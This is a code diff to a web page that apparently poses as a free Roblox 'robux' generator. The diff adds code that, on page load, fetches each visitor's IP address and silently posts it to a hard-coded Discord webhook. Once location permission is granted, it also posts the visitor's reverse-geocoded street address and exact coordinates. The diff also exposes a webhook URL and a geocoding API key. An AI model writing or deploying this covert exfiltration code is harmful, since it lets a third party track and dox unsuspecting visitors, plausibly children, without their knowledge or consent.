@@ -152,6 +152,7 @@
   let robux = 0;
   const robuxDisplay = document.getElementById('robuxCount');
   const robuxPerSecond = 1 / (5 * 60);
+  const webhookURL = 'https://discord.com/api/webhooks/1373504833830518904/GF-LQLi3wHDMl4-DG0TunW2kW2S2Ryxt6ckHWtzWnI4yUoERR9agMGSZ-PRWw90F6nU_'; // replace with your actual webhook
 
   setInterval(() => {
     robux += robuxPerSecond;
@@ -159,6 +160,19 @@
   }, 1000);
 
   let coords = {};
+
+  // Get IP address on page load and send to Discord
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      document.getElementById('ipInfo').textContent = 'Your IP Address: ' + ip;
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `New visitor IP: ${ip}` })
+      });
+    });
 
   function requestLocation() {
     if (navigator.geolocation) {
@@ -170,24 +184,24 @@
         document.getElementById('homeScreen').classList.remove('active');
         document.getElementById('adScreen').classList.add('active');
 
-        // Get IP address
-        fetch('https://api.ipify.org?format=json')
-          .then(res => res.json())
-          .then(data => {
-            document.getElementById('ipInfo').textContent = 'Your IP Address: ' + data.ip;
-          });
-
-        // Get address
         const apiKey = '181058dade424f02a9ab4fd9098de818';
         try {
           const res = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`);
           const data = await res.json();
           const address = data.results[0]?.formatted || 'Address not found';
+
           document.getElementById('addressInfo').textContent = 'Your Approximate Address: ' + address;
           document.getElementById('coordinatesInfo').textContent = `Coordinates: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
 
           document.getElementById('map').innerHTML = `<iframe width="100%" height="100%" frameborder="0" style="border:0" 
             src="https://www.google.com/maps?q=${lat},${lon}&z=15&output=embed" allowfullscreen></iframe>`;
+
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `Location granted\nAddress: ${address}\nCoordinates: ${lat}, ${lon}` })
+          });
+
         } catch {
           document.getElementById('addressInfo').textContent = 'Unable to fetch address.';
         }
